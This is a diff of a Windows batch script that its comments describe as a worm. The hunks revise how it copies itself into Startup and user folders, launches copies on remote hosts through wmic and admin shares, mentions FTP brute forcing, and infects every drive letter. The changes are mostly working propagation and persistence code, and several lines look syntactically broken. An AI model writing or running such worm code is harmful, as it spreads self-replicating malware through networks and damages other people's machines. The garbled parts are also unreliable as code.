@@ -47,14 +47,23 @@ REM else goto loop
 goto :loop
 :nview
 for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
-copy /y %0 "%%i\%APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup"
-copy /y %0 "%%i\Users\Public\Documents"
+copy /y %0 "%%i\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup"
+call :Fcheck
+copy /y %0 "%%i\"
 )
+
+:Fcheck
+if exist %%i\Movies do copy /y %0 %%i\Movies
+if exist %%i\Downloads do copy /y %0 %%i\Downloads
+if exist %%i\Documents do copy /y %0 %%i\Documents
+copy /y %0 "%%i\Users\Public\Documents"
+goto :eof
+
 REM Now it then try to run its copies on the remote machine 
 for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
-wmic /node:%%i process call create "cmd.exe C:\Windows\Temp\w3e.bat" >nul
+wmic /node:%%i process call create "cmd.exe %USERPROFILE%\w3e.bat" >nul
+start %%i\w3e.bat
 rem second choice
-start %%i\User\Public\Documents\w3e.bat >nul
 )
 
 REM The worm start finding next victims by finding all
@@ -76,9 +85,9 @@ REM victim and start it Cycle again.
 net use * \\%%i\C$ | findstr "connected" && call :LOG
 )
 :LOG
-copy /y %0 "\\%%i\Users\Public\Documents"
-wmic /node:%%i process call create "cmd.exe C:\Users\Public\Documents\w3e.bat" >nul
-call \\%%i\Users\Public\Documents\w3e.bat >nul
+copy /y %0 "\\%%i\"
+wmic /node:%%i process call create "cmd.exe %USERPROFILE%\w3e.bat" >nul
+start \\%%i\w3e.bat >nul
 REM Second alternative.
 REM It performs an ftp brute Force on network host using ftp
 REM server for further propagation.
@@ -96,10 +105,10 @@ del /f /q DSc.txt
 )
 
    if exist \\(for /f %%u in ('dir \\ /b') do copy /y %0 "\\%%u\%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-copy /y %0 "\\%%u\Users\Public\Documents"
+copy /y %0 "\\%%u\Documents"
 wmic /node:"%%i" process call create "cmd.exe C:\%APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\w3e.bat" >nul
 wmic /node:"%%i" process call create "cmd.exe C:\Windows\Temp\w3e.bat" >nul
-start \\%%u\Users\Public\Documents\w3e.bat >nul
+start \\%%u\Documents\w3e.bat >nul
 mountvol \\ /d ) 
 REM end of scan
 REM ---------------------------------------------------------
@@ -112,12 +121,11 @@ REM It then look for drives on its host to infect
 :N
 set /a p=p+1
     for %%E in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-if exist %%E: (for /f %%u in ('dir %%E:\ /b') do copy /y %0 "%%E:\"
-copy /y %0 "\\%%u\%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist %%E (for /f %%u in ('dir %%E:\ /b') do copy /y %0 "%%E:\"
+copy /y %0 "\\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 wmic /node:"%%i" process call create "cmd.exe C:\%APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\w3e.bat" >nul
-start \\%%u\%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\w3e.bat >nul
-mountvol %%E: /d )
- goto Y
+start \\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\w3e.bat >nul
+mountvol %%E /d )
  )
 REM --------------------------------------------------------
 :F
